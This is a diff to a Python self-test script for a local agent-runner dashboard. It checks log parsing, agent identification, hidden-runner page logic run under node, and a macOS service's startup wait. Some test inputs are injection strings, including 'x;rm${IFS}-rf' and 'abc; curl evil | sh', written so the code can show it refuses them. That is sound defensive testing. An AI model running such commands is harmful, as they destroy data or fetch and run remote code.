@@ -6,19 +6,24 @@
 Each fact is one line starting PASS or FAIL; the last line is FAILS=<count>, and the exit code is 1 if any failed.
 It starts dashboards of its own on free ports of this machine (127.0.0.1), works in a temporary directory, and
 stops and removes everything it started. It spends nothing and needs no agent. It takes about a minute, because
-several of its facts are about what happens after a wait.
+several of its facts are about what happens after a wait. The facts about the page's own rules are run under node,
+and those about the Mac service's wait with zsh and curl: where one of those is not on the PATH, a line starting
+SKIP says which facts were not run.
 
 What it proves is what one runner, one page or one stranger must not be able to do to the others: a report in the
 wrong shape cannot stop the page; a report cannot make the dashboard hold far more than was sent; callers that say
 nothing cannot shut the others out; the token goes to no address but the one that was set; a name the dashboard was
 not given is refused; a refusal is heard by the one refused; nothing is shown twice or cut in the middle, not when
 an answer is lost and not when a log is written again; what cannot arrive is named and the rest arrives; a process
-that is not a queue is not watched as one; nothing that is not plainly an identifier reaches a command.
+that is not a queue is not watched as one; nothing that is not plainly an identifier reaches a command. It also
+proves which agent a session log names, from what bin/render_stream.py itself writes; when a runner hidden on the
+page stays hidden and when it comes back; and that the Mac service waits for the dashboard it started.
 
 The facts about limits, refusals, places, lost answers, logs written again and reports that cannot arrive were
-each run as well against a copy of the kit with the thing they prove taken out, and failed there.
+each run as well against a copy of the kit with the thing they prove taken out, and failed there. So were the
+facts about the agent a log names, the page's own rules and the Mac service's wait.
 """
-import argparse, base64, gzip, hashlib, http.server, json, os, shutil, socket, subprocess, sys, tempfile, threading, time, urllib.error, urllib.request
+import argparse, base64, gzip, hashlib, http.server, json, os, re, shutil, socket, subprocess, sys, tempfile, threading, time, urllib.error, urllib.request
 KIT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 SP = tempfile.mkdtemp(prefix="runner-kit-dashboard-")
 sys.path.insert(0, KIT + "/bin")
@@ -515,7 +520,6 @@ check("and gives up, saying so, only when the runner has stayed ended for its la
 # ---- identifiers, the doctor's probe
 check("an identifier that is not plainly one is not read from a log", rr.session_in("attempt 1 of 4: new session x;rm${IFS}-rf\n") == "" and rr.session_in("attempt 1 of 4: new session 63447abd-ad04-43c4-90f3-6e91745fda9a\n") == "63447abd-ad04-43c4-90f3-6e91745fda9a")
 open(W + "/runs/in-charge", "w").write(json.dumps({"agent": "claude", "id": "abc; curl evil | sh", "at": 1}))
-check("a session log with no settings to say which agent wrote it is read for the lines the runner writes for the agent: claude, codex, or neither", (rr.agent_in("task 1.1\nclaude: done\n"), rr.agent_in("codex: done\n"), rr.agent_in("the claude: of a sentence\nx\n")) == ("claude", "codex", ""))
 check("nor from a hand-written in-charge file", rr.session_in_charge(place) is None)
 rc = subprocess.run([sys.executable, KIT + "/bin/runner_report.py", "--in-charge", "--agent", "claude", "--session", "a b;c"], capture_output=True, text=True, env={**os.environ})
 check("nor recorded by --in-charge", rc.returncode != 0 and "identifier" in rc.stderr, rc.stderr[:200])
@@ -537,5 +541,201 @@ with socket.create_connection(("127.0.0.1", port)) as raw_socket:
     raw_socket.sendall(b"GET /nothing-\x1b[31mred\x07-here HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n"); raw_socket.recv(4096)
 time.sleep(0.5); logged = open(errlog, "rb").read()
 check("a failed request is logged, with nothing in the line that could steer a terminal", b"nothing-" in logged and b"\x1b" not in logged and b"\x07" not in logged, logged[:200])
+
+
+# ---- which agent wrote a log, read from what bin/render_stream.py itself writes
+def rendered(events):
+    """What bin/render_stream.py writes for these events; one that is text and not an event goes in as it is."""
+    sent = "".join((e if isinstance(e, str) else json.dumps(e)) + "\n" for e in events)
+    return subprocess.run([sys.executable, KIT + "/bin/render_stream.py"], input=sent, capture_output=True, text=True).stdout
+by_claude = rendered([{"type": "system", "subtype": "init", "model": "a-model", "tools": [1, 2]},
+                      {"type": "assistant", "message": {"content": [{"type": "text", "text": "I will read the task."}, {"type": "tool_use", "name": "Bash", "input": {"command": "cat notes"}}]}},
+                      {"type": "user", "message": {"content": [{"type": "tool_result", "content": "codex: a line of a file, which no agent said"}]}},
+                      {"type": "result", "subtype": "success", "num_turns": 2, "total_cost_usd": 0.1, "result": "5s  codex: words quoted in the last answer"}])
+by_codex = rendered(["claude: command not found", {"type": "thread.started", "thread_id": "0199a3c2-7d4e"},
+                     {"type": "item.completed", "item": {"type": "agent_message", "text": "Done."}}, {"type": "turn.completed", "usage": {"input_tokens": 1, "output_tokens": 2}}])
+codex_said = "".join(l + "\n" for l in by_codex.split("\n") if l and "session started" not in l)     # the same log, had the session not named itself
+check("the agent is read from the lines render_stream.py writes for what an agent said, which begin with its clock",
+      "s  claude: I will read the task." in by_claude and "s  codex: Done." in by_codex and (rr.agent_in(by_claude), rr.agent_in(codex_said)) == ("claude", "codex"), (by_claude, by_codex, rr.agent_in(by_claude), rr.agent_in(codex_said)))
+check("a line with no clock is not what an agent said: 'claude: command not found' in a Codex log does not name it Claude, and words quoted in a last answer name nobody",
+      "claude: command not found\n" in codex_said and rr.agent_in(codex_said) == "codex" and (rr.agent_in("claude: command not found\ncodex: nor this\n"), rr.agent_in("      5s  codex: quoted\n"), rr.agent_in("the claude: of a sentence\n")) == ("", "", ""),
+      (codex_said, rr.agent_in(codex_said), rr.agent_in("claude: command not found\ncodex: nor this\n"), rr.agent_in("      5s  codex: quoted\n")))
+check("lines that name both agents name neither: the one tried first does not win", rr.agent_in(by_claude + codex_said) == "" and rr.agent_in(codex_said + by_claude) == "", (rr.agent_in(by_claude + codex_said), rr.agent_in(codex_said + by_claude)))
+check("a Codex session that names itself as it starts is taken at its word, before any line of what was said",
+      (rr.agent_in(by_codex.split("s  codex: ")[0]), rr.agent_in(by_codex + "     9s  claude: said by another\n"), rr.agent_in("session started  codex thread=no-clock\n")) == ("codex", "codex", ""), by_codex)
+# A workspace whose settings name no adapter: the report itself carries the agent read from the log.
+W8, place8 = workspace("agent-from-the-log")
+open(W8 + "/runs/1.1-20260101-000000.log", "w").write("attempt 1 of 4: new session abc-888\n" + by_claude)
+work8 = rr.Reporter(place8, os.getpid(), "1.1").build()[0]["sessions"]["work"]
+check("a report from a workspace whose settings name no agent carries the agent read from its session log", work8 and (work8["kind"], work8["agent"], work8["id"]) == ("task", "claude", "abc-888"), work8)
+open(W8 + "/runs/queue.log", "w").write("2026-01-01 10:00:00 supervising session old-stop-1 for task 1.0; raw x\n" + codex_said + "2026-01-01 10:01:00 verdict: SUPERVISOR: retry\n"
+                                        "2026-01-01 10:02:00 supervising session new-stop-2 for task 1.1; raw y\n" + by_claude)
+work8 = rr.Reporter(place8, os.getpid(), "").build()[0]["sessions"]["work"]
+check("and a stop session is named from its own lines in the queue log, not from an earlier stop session's", work8 and (work8["kind"], work8["agent"], work8["id"]) == ("stop", "claude", "new-stop-2"), work8)
+
+# ---- the page's own rules, run outside a browser
+# The page marks the functions that need no browser (selftest-from to selftest-to). They are run here under node,
+# with stand-ins for the little of the page they name. Without node they are not run, and this says so.
+PAGE = open(KIT + "/dashboard/index.html", encoding="utf-8").read()
+marked = [part.split("// selftest-to\n")[0] for part in PAGE.split("// selftest-from\n")[1:]]
+STAND_INS = r"""'use strict';
+// A fact is a function that answers [is it so, what was found]. One that cannot be run is a fact that failed.
+const facts = [];
+function fact(name, find) {
+  let ok = false, detail;
+  try { [ok, detail] = find(); } catch (e) { detail = 'could not be run: ' + e.message; }
+  facts.push([name, !!ok, detail === undefined ? '' : JSON.stringify(detail)]);
+}
+const document = { createElement: (tag) => ({ tag, attrs: {}, kids: [], on: {}, className: '',
+  setAttribute(k, v) { this.attrs[k] = v; }, addEventListener(name, fn) { this.on[name] = fn; }, append(...kids) { this.kids.push(...kids); } }) };
+const KEEP_LINES = 1500, STATE = { models: new Map(), first: true };
+let painted = 0, added = 0;
+const status = (r) => ({ k: r.state }), label = (m) => m.id, news = () => {}, wire = () => {};
+const paint = () => { painted++; }, addLines = (m, lines) => { added += lines.length; };
+"""
+FACTS = r"""
+const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);
+const runner = (state, more) => ({ state, info: { pid: 100 }, parked: [], ...more });
+const seen = (r, age) => hiddenSeen(r, age || 0, 600);
+const hideAt = (r, age) => hiddenRecord({}, seen(r, age), 1000);
+// Hidden with `rec`, a runner is then seen in each of these in turn: at which does it come back, and why?
+function follow(rec, steps) {
+  for (let i = 0; i < steps.length; i++) {
+    const to = hiddenNext(rec, seen(...[].concat(steps[i])));
+    if (typeof to === 'string') return [i, to];
+    rec = to;
+  }
+  return 'stays hidden';
+}
+const one = [{ id: '1.1' }], two = [{ id: '1.1' }, { id: '1.2' }];
+const buttons = (parts) => parts.filter((part) => part.tag === 'button');
+// The browser's storage, as two tabs of one browser share it; and one that is full.
+const storage = () => ({ held: {}, getItem(k) { return k in this.held ? this.held[k] : null; }, setItem(k, v) { this.held[k] = String(v); } });
+const full = { getItem: () => null, setItem() { throw new Error('QuotaExceededError'); } };
+const add = (id) => (map) => { map[id] = hiddenRecord(map, seen(runner('running')), 1000); };
+
+fact('a runner hidden during a task stays hidden while its queue moves from task to task, and so does one hidden between tasks', () => {
+  const queue = ['between', 'running', 'deciding', 'running', 'between', 'running'].map((s) => runner(s));
+  const found = [follow(hideAt(runner('running')), queue), follow(hideAt(runner('between')), queue)];
+  return [same(found, ['stays hidden', 'stays hidden']), found];
+});
+fact('a runner hidden while it ran comes back when it starts work again after it stopped, finished its queue, paused or went silent', () => {
+  const found = [['stopped'], ['idle'], ['paused'], ['running', 700]].map(([state, age]) => follow(hideAt(runner('running')), [runner('between'), [runner(state), age], runner('running')]));
+  return [same(found, [[2, 'work'], [2, 'work'], [2, 'work'], [2, 'work']]), found];
+});
+fact('and when this page never saw it stop, because another run of the runner is what works now; a runner at rest that stays at rest does not come back', () => {
+  const found = [follow(hideAt(runner('running')), [runner('running', { info: { pid: 200 } })]), follow(hideAt(runner('stopped')), [runner('stopped'), runner('idle'), runner('stopped', { info: { pid: 200 } })])];
+  return [same(found, [[0, 'work'], 'stays hidden']), found];
+});
+fact('a hidden runner comes back for a new question: a second beside the first, one parked during its queue, one parked again after its answer; and not for a question fewer', () => {
+  const found = [follow(hideAt(runner('idle', { parked: one })), [runner('idle', { parked: one }), runner('idle', { parked: two })]),
+    follow(hideAt(runner('running')), [runner('running'), runner('between', { parked: one })]),
+    follow(hideAt(runner('idle', { parked: one })), [runner('idle', { parked: [] }), runner('idle', { parked: one })]),
+    follow(hideAt(runner('idle', { parked: two })), [runner('idle', { parked: one }), runner('idle', { parked: one })])];
+  return [same(found, [[1, 'question'], [1, 'question'], [1, 'question'], 'stays hidden']), found];
+});
+fact('what an earlier page kept is read: such a runner stays hidden, and what it is doing is taken from its next report', () => {
+  const old = hiddenParse('{"a":"running","b":"waiting","c":7,"d":{"at":5,"phase":"work","asks":["1.1",2],"run":100}}');
+  const found = [Object.keys(old), follow(old.b, [runner('idle', { parked: one }), runner('idle', { parked: one })]), follow(old.b, [runner('idle', { parked: one }), runner('idle', { parked: two })]), old.d.asks, Object.keys(hiddenParse('not json'))];
+  return [same(found, [['a', 'b', 'd'], 'stays hidden', [1, 'question'], ['1.1'], []]), found];
+});
+fact('two open tabs do not undo each other: each change is made to what the browser holds at that moment', () => {
+  const shared = storage();
+  let a = hiddenLoad(shared), b = hiddenLoad(shared);     // both tabs are open before anything is hidden
+  a = hiddenChange(shared, a.map, a.kept, add('x'));
+  b = hiddenChange(shared, b.map, b.kept, add('y'));
+  const both = Object.keys(hiddenParse(shared.getItem(HIDDEN_KEY))).sort();
+  a = hiddenChange(shared, a.map, a.kept, (map) => { delete map.x; });
+  const found = [both, Object.keys(hiddenParse(shared.getItem(HIDDEN_KEY))), Object.keys(a.map)];
+  return [same(found, [['x', 'y'], ['y'], ['y']]), found];
+});
+fact('when more are hidden than are kept, the one hidden first is forgotten first, though its id is a word and the others are numbers', () => {
+  const shared = storage();
+  let all = hiddenLoad(shared);
+  for (const id of ['alpha', ...Array.from({ length: HIDDEN_MOST }, (_, i) => String(i + 1))]) all = hiddenChange(shared, all.map, all.kept, add(id));
+  return [Object.keys(all.map).length === HIDDEN_MOST && !('alpha' in all.map) && '1' in all.map && String(HIDDEN_MOST) in all.map, Object.keys(all.map).slice(0, 3)];
+});
+fact('where the browser will not store it, a runner is hidden all the same, and the line of hidden runners says the choice will not be remembered on this device', () => {
+  let lone = hiddenChange(full, Object.create(null), true, add('x'));
+  const first = [lone.kept, Object.keys(lone.map)];
+  lone = hiddenChange(full, lone.map, lone.kept, add('y'));
+  const said = (kept) => hiddenLine([{ id: 'x', name: 'X' }], kept, () => {}).filter((part) => part.tag === 'span').map((part) => part.kids.join(''));
+  const found = [first, lone.kept, Object.keys(lone.map).sort(), hiddenLoad(null).kept, said(true), said(false).length];
+  return [same(found, [[false, ['x']], false, ['x', 'y'], false, [], 1]) && /will not be remembered on this device/.test(said(false)[0]), [found, said(false)]];
+});
+fact('the line of hidden runners names each one, with a button that brings back that one, and one that brings back all', () => {
+  const shown = [], line = buttons(hiddenLine([{ id: 'r1', name: 'Alpha' }, { id: 'r2', name: 'Beta' }], true, (id) => shown.push(id)));
+  line[1].on.click(); line[2].on.click();
+  const found = [line.map((x) => x.kids.join('')), shown, buttons(hiddenLine([{ id: 'r1', name: 'Alpha' }], true, () => {})).length];
+  return [same(found, [['Alpha', 'Beta', 'show all 2'], ['r2', null], 1]), found];
+});
+fact('what reads as a link and is pressed is a button, which the keyboard reaches', () => {
+  let pressed = 0;
+  const press = link('Hide', () => { pressed++; }, { 'data-x': 'y' });
+  press.on.click();
+  const found = [press.tag, press.attrs.type, press.className, press.attrs['data-x'], pressed];
+  return [same(found, ['button', 'button', 'link', 'y', 1]), found];
+});
+fact('with no pane under "At work" the page says that no runner is at work, or that those at work are hidden; with a pane there it says neither', () => {
+  const found = [emptyWords(0, 0), emptyWords(0, 1), emptyWords(0, 2), emptyWords(1, 0), emptyWords(3, 2)];
+  return [found[0] === 'No runner is at work.' && /1 at work is hidden on this device/.test(found[1]) && /2 at work are hidden on this device/.test(found[2]) && found[3] === '' && found[4] === '', found];
+});
+fact('when the pane the keyboard is on is hidden, the keyboard goes to the next pane, else the one before, else the line of hidden runners', () => {
+  const found = [neighbour(['a', 'b', 'c'], 'b'), neighbour(['a', 'b', 'c'], 'c'), neighbour(['a'], 'a'), neighbour(['a'], 'z')];
+  return [same(found, ['c', 'b', null, null]), found];
+});
+fact('a pane that is not on the page is not painted: its lines wait, and a log that starts afresh while it is away is shown afresh when it returns', () => {
+  const off = { id: 'off', seq: 0, hits: [], sig: {}, el: { isConnected: false }, data: runner('running') };
+  const on = { id: 'on', seq: 0, hits: [], sig: {}, el: { isConnected: true }, data: runner('running') };
+  STATE.models.set('off', off); STATE.models.set('on', on);
+  take({ id: 'off', state: 'running', lines: [[1, 'o', 'one'], [2, 'o', 'two']] });
+  const waiting = [painted, added, (off.buffer || []).length];
+  take({ id: 'off', state: 'running', reset: true, lines: [[1, 'o', 'afresh']] });
+  take({ id: 'on', state: 'running', lines: [[1, 'o', 'one']] });
+  const found = [waiting, off.buffer.length, off.wipe, painted, added];
+  return [same(found, [[0, 0, 2], 1, true, 1, 1]), found];
+});
+console.log(JSON.stringify(facts));
+"""
+node = shutil.which("node")
+if not node:
+    print("SKIP the page's own rules (when a hidden runner comes back, what two tabs keep, what the line of hidden runners says, what is painted): node is not on the PATH, so none of them was run")
+else:
+    open(SP + "/page-rules.js", "w", encoding="utf-8").write(STAND_INS + "".join(marked) + FACTS)
+    ran = subprocess.run([node, SP + "/page-rules.js"], capture_output=True, text=True, timeout=60)
+    try: page_facts = json.loads(ran.stdout.strip().split("\n")[-1])
+    except ValueError: page_facts = []
+    check("the page's functions that need no browser run under node (%d parts of the page, %d facts)" % (len(marked), len(page_facts)), ran.returncode == 0 and len(marked) >= 3 and len(page_facts) >= 13, ran.stderr[-300:])
+    for name, ok, detail in page_facts: check("the page: " + name, ok, detail)
+# What only the page's text can show, short of a browser.
+bare = [m.group(0)[:60] for m in re.finditer(r"h\('a', \{[^}]*", PAGE) if "href:" not in m.group(0)]
+check("nothing on the page that is pressed is a link with no address, which the keyboard cannot reach", bare == [] and "h('a', {" in PAGE and PAGE.count("link('") >= 4, bare)
+touch = re.search(r"@media \(max-width: 600px\), \(pointer: coarse\) \{(.*?)\n  \}", PAGE, re.S)
+sizes = [int(n) for n in re.findall(r"\.p-side \.icon \{ min-width: (\d+)px; min-height: (\d+)px; \}", touch.group(1))[0]] if touch and ".p-side .icon" in touch.group(1) else []
+gap = re.search(r"\.p-side \{ gap: (\d+)px; \}", touch.group(1)) if touch else None
+check("under a finger a pane's two buttons are at least 44 pixels each way and at least 12 apart", len(sizes) == 2 and min(sizes) >= 44 and gap and int(gap.group(1)) >= 12 and PAGE.index(touch.group(0)) > PAGE.index(".icon, .tool { min-height: 34px"), (sizes, gap and gap.group(0)))
+hide_body = PAGE.split("function hide(m) {")[1].split("\n}\n")[0]
+check("the page follows a change made in another tab", "addEventListener('storage', (e) =>" in PAGE)
+check("hiding a runner moves the keyboard on and says so where a reader of the screen hears it", "el.focus()" in hide_body and "\n  toast(" in hide_body and 'id="toast" role="status" aria-live="polite"' in PAGE, hide_body[-400:])
+
+# ---- the Mac service waits for what it started, without launchd
+SERVICE = KIT + "/dashboard/service-macos.sh"
+def free_port():
+    with socket.socket() as s: s.bind(("127.0.0.1", 0)); return s.getsockname()[1]
+def wait_for(port, seconds):
+    """service-macos.sh's own wait, on its own question to the dashboard: (exit code, seconds it took)."""
+    t0 = time.time()
+    try: rc = subprocess.run(["zsh", "-c", 'source "$0" --port "$1"; wait_until "$2" answers', SERVICE, str(port), str(seconds)], capture_output=True, timeout=40).returncode
+    except subprocess.TimeoutExpired: rc = "still waiting after 40 seconds"
+    return rc, time.time() - t0
+if not shutil.which("zsh") or not shutil.which("curl"):
+    print("SKIP the Mac service's wait for the dashboard: zsh or curl is not on the PATH, so it was not run")
+else:
+    late = free_port()
+    threading.Timer(2.5, lambda: procs.append(subprocess.Popen([sys.executable, KIT + "/dashboard/serve.py", "--port", str(late), "--state-dir", tempfile.mkdtemp(dir=SP, prefix="rf-state-")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))).start()
+    rc_late, took_late = wait_for(late, 30)
+    check("the Mac service's wait goes on asking a dashboard that starts late, and ends when it answers (after %.1fs)" % took_late, rc_late == 0 and 2 <= took_late < 20, (rc_late, took_late))
+    rc_never, took_never = wait_for(free_port(), 2)
+    check("and gives up on one that never answers when its time is up (after %.1fs of 2)" % took_never, rc_never == 1 and 2 <= took_never < 12, (rc_never, took_never))
 
 print("FAILS=%d" % len(FAILS)); sys.exit(1 if FAILS else 0)
